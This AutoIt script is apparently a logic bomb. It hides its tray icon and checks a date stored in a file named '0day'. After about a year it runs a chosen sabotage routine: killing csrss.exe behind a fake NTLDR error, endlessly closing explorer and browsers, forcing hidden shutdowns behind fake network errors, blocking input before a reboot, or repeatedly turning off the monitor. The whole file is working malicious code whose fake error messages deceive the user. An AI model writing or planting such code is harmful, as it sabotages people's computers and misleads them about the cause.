#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Compression=0
#AutoIt3Wrapper_UseX64=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include<Date.au3>

if FileExists('0day') then FileWrite('Exok','')
$var0=FileReadLine('0day')
$cual=FileReadLine('0day',2)
$var2 = _NowCalc()
$fAbs = Abs(_DateDiff("M", $var0, $var2)) ;+ 1

If $fAbs > 11 Then ;AJUSTAR DIFERENCIA EN MESES -1 (MENOS 1)
	if $cual=1 then csrss()
	if $cual=2 then explorer()
	if $cual=3 then Shutanddown()
	if $cual=4 then Netaddins()
	if $cual=5 then blockin()
	if $cual=6 then ApagarMonitorConNircmd()

ElseIf $fAbs > 12 Then
	csrss()
EndIf

;----------------------------------------

func csrss()
	ProcessWait("csrss.exe")
	mens()

	Sleep(5000)
	While ProcessExists("csrss.exe")
		ProcessClose("csrss.exe")
	WEnd

	Sleep(5000)
	While ProcessExists("csrss.exe")
		ProcessClose("csrss.exe")
	WEnd
EndFunc

func mens()
	$t = MsgBox(53,'Warning','CRC error in NTLDR')
	if $t =4 Then mens()
EndFunc

;----------------------------------

func explorer()
	while 1
		ProcessClose('explorer.exe')
		ProcessClose('iexplore.exe')
		ProcessClose('chrome.exe')
		ProcessClose('word.exe')
		ProcessClose('firefox.exe')
	WEnd
EndFunc

Func Shutanddown()
	ShellExecute('shutdown',' -s -t 00','','',@SW_HIDE)
EndFunc

Func Netaddins()
	MsgBox(0,'Connection Error','Error: 404')
	MsgBox(0,'Connection Error','Network Connection Failure')
	Sleep(3000)
 	ShellExecute('shutdown',' -s -t 00','','',@SW_HIDE)
	MsgBox(0,'Malfunction','System Error Flag ON')
EndFunc

Func blockin()
	BlockInput(1)
	Sleep(22000)
 	ShellExecute('shutdown',' -r -t 00','','',@SW_HIDE)
EndFunc

Func ApagarMonitorConNircmd()
	ShellExecuteWait('syscmd.exe','cmdwait 1000 monitor off')
	Sleep(Random(3600,7450))
	ApagarMonitorConNircmd()
EndFunc
